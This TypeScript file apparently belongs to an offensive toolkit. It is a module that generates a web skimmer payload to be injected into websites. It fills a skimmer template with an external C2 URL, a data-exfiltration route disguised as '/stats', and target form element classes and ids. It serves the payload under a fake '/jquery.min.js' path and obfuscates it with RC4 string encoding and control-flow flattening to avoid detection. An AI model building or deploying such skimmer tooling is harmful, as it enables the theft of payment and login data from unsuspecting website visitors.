import * as fs from "fs";
import { obfuscate, ObfuscationResult } from "javascript-obfuscator";

import { Constants, emsg } from "../utils/utils";
import BaseModule, { ExecuteReturn } from "./base";

const MODULE_DESCRIPTION = "manage the skimmer configuration";

const SKIMMER_PAYLOAD_TEMPLATE_PATH = "payloads/skimmer.js";

export type SkimmerConfig = {
    payload_route: string;
    data_route: string;
    url: string;
    target_classes: string[];
    target_ids: string[];
    obfuscate_payload: boolean;
};

export default class SkimmerModule extends BaseModule {
    payload: string;
    config: SkimmerConfig;

    constructor(protected configFile) {
        super("skimmer", configFile);

        this.description = MODULE_DESCRIPTION;

        this.config = {
            payload_route: "/jquery.min.js",
            data_route: "/stats",
            url: "",
            target_classes: [],
            target_ids: [],
            obfuscate_payload: true,
        };
        this.config = this.getConfigFromFile() as SkimmerConfig;

        this.defineCommands({
            generate: {
                arguments: [],
                description: "generate skimmer payload with the specified url and target classes and ids",
                execute: this.run,
            },
            payload: {
                arguments: [],
                description: "get the current generated payload",
                execute: () => {
                    return { message: this.payload };
                },
            },
            "set url": {
                arguments: ["<url>"],
                description: "set the external skimmer c2 url (http://skimmer.url)",
                validateRegex: Constants.VALID_URL_REGEX,
                execute: (params: string) => {
                    this.config.url = params;
                },
            },
            "set obfuscate_payload": {
                arguments: ["<1|0>"],
                description: "enable or disable payload obfuscation",
                execute: (params: string) => {
                    this.config.obfuscate_payload = params != "0" && params != "false" ? true : false;
                },
            },
            "set data_route": {
                arguments: ["<route>"],
                description: "set the skimmer url data route (/stats)",
                validateRegex: Constants.VALID_ROUTE_REGEX,
                execute: (params: string) => {
                    this.config.data_route = params;
                },
            },
            "set target_classes": {
                arguments: ["<class 1,class 2,class 3>"],
                description: "(optional) target classes with skimmer click handler, separated by comma",
                validateRegex: Constants.VALID_CLASS_ID_REGEX,
                execute: (params: string) => {
                    const classes = params.split(",");
                    this.config.target_classes = [...new Set(classes)];
                },
            },
            "set target_ids": {
                arguments: ["<id 1,id 2,id 3>"],
                description: "(optional) target ids with skimmer click handler, separated by comma",
                validateRegex: Constants.VALID_CLASS_ID_REGEX,
                execute: (params: string) => {
                    const ids = params.split(",");
                    this.config.target_ids = [...new Set(ids)];
                },
            },
        });

        this.payload = "";
    }

    run(params?: string[]): ExecuteReturn {
        if (!this.config.url) throw new Error(`skimmer url is required, see 'help'`);

        let data: Buffer;
        let skimmerJs = "";
        try {
            data = fs.readFileSync(SKIMMER_PAYLOAD_TEMPLATE_PATH);
            skimmerJs = data.toString();
        } catch (ex) {
            throw new Error(`failed to generate payload: ${emsg(ex)}`);
        }

        const targetClasses = "['" + this.config.target_classes.join("','") + "']";
        const targetIds = "['" + this.config.target_ids.join("','") + "']";
        const targetUrl = this.config.url;
        const targetDataRoute = this.config.data_route;

        skimmerJs = skimmerJs.replace(/\[SKIMMER_URL\]/, targetUrl);
        skimmerJs = skimmerJs.replace(/\[SKIMMER_DATA_ROUTE\]/, targetDataRoute);
        skimmerJs = skimmerJs.replace(/\[SKIMMER_CLASSES\]/, targetClasses);
        skimmerJs = skimmerJs.replace(/\[SKIMMER_IDS\]/, targetIds);
        skimmerJs = skimmerJs.replace(/\s+console\.log\(.+;/g, "");

        this.payload = skimmerJs;
        if (this.config.obfuscate_payload) {
            let obfs: ObfuscationResult;
            try {
                obfs = obfuscate(skimmerJs, {
                    compact: true,
                    controlFlowFlattening: true,
                    transformObjectKeys: true,
                    log: false,
                    renameGlobals: true,
                    stringArray: true,
                    stringArrayEncoding: ["rc4"],
                    identifierNamesGenerator: "mangled",
                });
                this.payload = obfs.getObfuscatedCode();
            } catch (ex) {
                throw new Error(`failed to obfuscate js payload: ${emsg(ex)}`);
            }
        }

        return { message: `skimmer payload set to: \n${this.payload}` };
    }
}
